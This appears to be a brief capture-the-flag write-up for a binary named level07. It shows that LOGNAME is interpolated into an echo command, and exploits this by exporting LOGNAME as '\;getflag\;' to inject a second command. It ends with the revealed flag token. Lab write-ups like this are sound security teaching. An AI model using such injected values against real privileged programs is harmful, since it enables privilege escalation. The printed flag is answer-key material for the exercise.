##### 1 - Analyzing the content

``strings level07``
>LOGNAME
>/bin/echo %s

We understand that the binary will execute the command ``echo`` with the argument ``%s``.
The ``%s`` will be replaced by the value of the environment variable ``LOGNAME``.


----

##### 2 - Exployting the binary

We can create a new environment variable ``LOGNAME`` with the value ``\;getflag\;``.
The binary will execute the command ``echo`` with the argument ``\;getflag\;`` to do : ``echo ;getflag;``.
``export LOGNAME=\;getflag\;``

----

##### 3 - Getting the flag

``./level07``
>Check flag.Here is your token : **fiumuikeil55xe9cu4dood66h**
